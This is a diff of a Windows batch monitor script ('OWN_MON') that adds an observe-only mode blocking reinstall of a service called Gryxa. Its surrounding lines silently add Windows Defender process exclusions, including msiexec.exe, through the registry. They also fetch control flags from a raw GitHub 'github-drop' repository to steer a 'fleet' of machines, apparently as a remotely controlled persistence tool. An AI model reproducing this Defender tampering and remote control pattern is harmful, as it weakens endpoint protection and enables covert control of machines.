@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M61
+rem  OWN_MON  BUILD 20260804M62
+rem  M62: QueueGryxaHeal hard-blocked under OBSERVE; pair with G10 (no shared ProductCode /x).
 rem  M61: arm gryxa_watch LOOP — record all Gryxa interference; Telegram on DROP with CAUSE.
 rem  M60: OBSERVE mode — no heal/force/reinstall; log health to drop_trace.log (prove drop cause).
 rem  M59: stop drop+reinstall — clear force SKIP if healthy; HEAL/Ensure 1060-only; G9 never /x on HEAL.
@@ -66,8 +67,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M61"
-set "MON_MIN=M60"
+set "MONVER=M62"
+set "MON_MIN=M61"
 set "GIT_PIN="
 set "CHANNEL_URL=https://raw.githubusercontent.com/xnobuddy/github-drop/main/fleet_channel.cfg?t=%RANDOM%%RANDOM%"
 set "FLOOR_FILE=%WD%\version_floor.cfg"
@@ -607,6 +608,11 @@ if exist "%WD%\observe.new" (
 )
 if exist "%WD%\observe.flag" set "OBSERVE=1"
 if "!OBSERVE!"=="1" echo gryxa_OBSERVE_mode_no_heal_no_force>>"%LOG%"
+rem rotate old gryxa uninstall evidence so diag VERDICT is not forever OUR_GRYXA_UNINSTALL
+if "!OBSERVE!"=="1" if exist "%WD%\own_gryxa.log" if not exist "%WD%\own_gryxa.log.pre_observe" (
+  move /y "%WD%\own_gryxa.log" "%WD%\own_gryxa.log.pre_observe" >nul 2>&1
+  echo gryxa_log_rotated_pre_observe>>"%LOG%"
+)
 
 rem FORCE push: content-hash via fc /b (re-fire when flag content changes); raw-first
 "%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%WD%\force_gryxa.new" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/force_gryxa.flag?t=%RANDOM%%RANDOM%" >nul 2>&1
@@ -965,6 +971,10 @@ exit /b 0
 
 :QueueGryxaHeal
 rem %1=REINSTALL|HEAL — rate-limit 90m UNLESS service is 1060 (always allow recover)
+if exist "%WD%\observe.flag" (
+  echo gryxa_heal_blocked_OBSERVE>>"%LOG%"
+  exit /b 0
+)
 set "HEALMODE=%~1"
 if "%HEALMODE%"=="" set "HEALMODE=HEAL"
 set "BYPASS_RL=0"
